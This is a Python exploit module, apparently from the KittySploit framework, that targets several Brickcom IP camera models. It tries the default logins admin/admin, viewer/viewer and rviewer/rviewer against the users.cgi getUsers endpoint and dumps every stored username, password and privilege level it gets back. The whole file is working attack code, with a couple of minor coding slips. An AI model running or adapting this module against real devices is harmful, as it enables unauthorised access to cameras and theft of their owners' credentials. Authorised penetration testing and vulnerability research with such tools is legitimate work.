from kittysploit import *
from lib.protocols.http.http_client import Http_client
import re

class Module(Auxiliary, Http_client):


	__info__ = {
			"name": "Brickcom Camera Credentials Disclosure",
			"description": "Allows remote credential disclosure by low-privilege user.",
			"author": "KittySploit Team",
			"targets": [
				"Brickcom WCB-040Af",
				"Brickcom WCB-100A",
				"Brickcom WCB-100Ae",
				"Brickcom OB-302Np",
				"Brickcom OB-300Af",
				"Brickcom OB-500Af",
			],
			
		}
	
	def run(self):
		credentials = (
			("admin", "admin"),
			("viewer", "viewer"),
			("rviewer", "rviewer"),
		)				

		for username, password in credentials:
			response = self.http_request(
				method="GET",
				path="/cgi-bin/users.cgi?action=getUsers",
				auth=(username, password)
			)

			if response is None:
				fail.NotVulnerable
				break

			if any([re.findall(regexp, response.text) for regexp in [r"User1.username=.*", r"User1.password=.*", r"User1.privilege=.*"]]):
				configuration = response.text
				print_success("Target appears to be vulnerable")
				print_status("Dumping configuration...")
				print_info(configuration)
				Vulnerable.SUCCESS()
			else:
				fail.NotVulnerable()
